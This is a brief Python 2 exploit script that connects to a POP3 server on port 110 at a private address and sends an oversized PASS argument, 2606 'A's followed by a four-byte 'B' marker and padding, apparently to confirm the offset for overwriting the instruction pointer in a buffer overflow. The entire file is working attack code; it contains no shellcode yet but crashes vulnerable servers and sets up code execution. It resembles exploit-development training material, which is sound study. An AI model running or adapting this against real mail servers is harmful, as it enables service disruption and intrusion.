#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = 'A' * 2606 + "B" * 4 + "C" * (3500 - 2606 -4)
try:

    print "\nSending evil buffer..."
    s.connect(('10.209.42.149',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
